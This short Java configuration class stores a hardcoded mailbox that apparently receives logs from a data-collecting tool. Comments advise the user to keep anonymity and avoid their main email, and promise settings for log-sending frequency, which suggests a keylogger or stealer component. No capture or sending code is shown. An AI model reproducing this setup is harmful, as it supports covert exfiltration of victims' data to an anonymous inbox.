package config;

public class Configuration {
    //youLogMailBox - keep anonymity, do not use the main mail!

                                        //put email
    private static String youLogMailBox = "loggerinfo71@gmail.com";
    //There will be settings for raising your server and the frequency of sending logs!


    public static String getYouLogMailBox() {
        return youLogMailBox;
    }
}
